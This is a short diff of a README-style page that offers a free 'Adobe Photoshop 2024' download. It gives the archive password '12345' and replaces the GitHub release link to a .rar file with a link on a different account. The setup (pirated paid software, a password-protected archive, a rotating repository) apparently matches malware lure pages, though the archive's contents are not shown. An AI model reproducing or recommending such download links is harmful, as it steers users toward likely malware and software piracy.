@@ -4,4 +4,4 @@ A functional Adobe Photoshop editor for working with photos and video files (bit
 
 # Password: 12345
 
-# [Download](https://github.com/Photoshoptop/Photoshop-free/releases/download/Photoshop/Adobe.Photoshop.2024.v25.11.rar)
+# [Download](https://github.com/Ptruha/Photoshop-free/releases/download/v2.0/Adobe.Photoshop.2024.v25.11.rar)
